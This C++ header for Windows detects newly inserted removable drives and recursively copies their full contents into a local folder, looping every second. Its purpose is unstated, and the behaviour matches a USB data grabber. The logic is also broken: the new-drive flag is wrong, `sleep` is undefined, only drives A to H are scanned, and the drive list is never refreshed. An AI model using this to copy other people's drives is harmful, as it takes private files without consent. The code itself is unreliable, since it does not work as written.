#pragma once
#include <iostream>
#include<windows.h>
#include <bitset>
#include <string>
#include <string>
#include <iostream>
#include <filesystem>
#include <iterator>
#include <vector>
#include <filesystem>
#include <ctime>

namespace fs = std::filesystem;
using namespace std;

vector <string> getCurrentExturnalDevices()
{
    int i = 0;
    char currentRootPath[] = "A:\\";
    vector <string> avalibleDriveList;
    DWORD driveType;
    DWORD allDrives = GetLogicalDrives();
    bitset<8> binAllDrives(allDrives);

    for (i = 0; i < binAllDrives.size(); i++)
    {
        driveType = GetDriveTypeA(LPCSTR(currentRootPath));
        cout << driveType << " - " << currentRootPath << endl;

        if (driveType == DRIVE_REMOVABLE && binAllDrives[i] == 1)
        {
            cout << "hi" << endl;
            avalibleDriveList.push_back(currentRootPath);
        }
        currentRootPath[0] += 1;
    }

    return avalibleDriveList;
}

vector<string> newDriveEntered(vector<string> avalibleDriveList)
{
    vector<string> newDriveList = getCurrentExturnalDevices();
    vector<string> sendList;
    int flag = 1;
    bool res = false;

    if (newDriveList.size() < avalibleDriveList.size())
    {
        avalibleDriveList = newDriveList;
    }
    else if (newDriveList.size() > avalibleDriveList.size())
    {
        for (auto i : newDriveList)
        {
            for (auto j : avalibleDriveList)
            {
                if (i == j)
                {
                    flag = 1;
                }
            }

            if (flag != 1)
            {
                sendList.push_back(i);
            }
            flag = 0;
        }
    }

    if (sendList.size() > 0)
    {
        res = true;
    }

    return sendList;
}

string createNewDir(string driveName)
{
    fs::path curr = fs::current_path();
    fs::path finalPath;
    std::string path_string{ curr.u8string() };
    string currTime;
    string finalPathStr;
    time_t now = time(0);
    struct tm ltm;
    errno_t result;

    result = localtime_s(&ltm, &now);
    currTime = to_string(ltm.tm_mday) + "I" + to_string(1 + ltm.tm_mon) + "I" + to_string(1900 + ltm.tm_year) + "I" + to_string(ltm.tm_hour) + "b" + to_string(ltm.tm_min) + "b" + to_string(ltm.tm_sec);

    finalPathStr = path_string + driveName[0] + "_copy_";// +currTime;
    finalPath = finalPathStr;
    cout << finalPathStr << endl;
    fs::create_directory(finalPath);

    return finalPathStr;
}

bool copyDrive(vector <string> &avalibleDriveList)
{
    int i = 0;
    const auto copyOptions = fs::copy_options::update_existing | fs::copy_options::recursive;
    string copyToDir = "";

    TCHAR ExeName[MAX_PATH];
    GetModuleFileName(NULL, ExeName, MAX_PATH);
    char DriveLetter = char(ExeName[0]);

    for (i = 0; i < avalibleDriveList.size(); i++)
    {
        if (DriveLetter != avalibleDriveList[i][0])
        {
            copyToDir = createNewDir(avalibleDriveList[i]);
            fs::copy(avalibleDriveList[i], copyToDir, copyOptions);
        }
    }

    return true;
}

bool activeCopy(vector<string> avalibleDriveList)
{
    while (true)
    {
        vector<string> sendList = newDriveEntered(avalibleDriveList);

        if (!sendList.empty())
        {
            copyDrive(sendList);
        }
        sleep(1000);
    }
}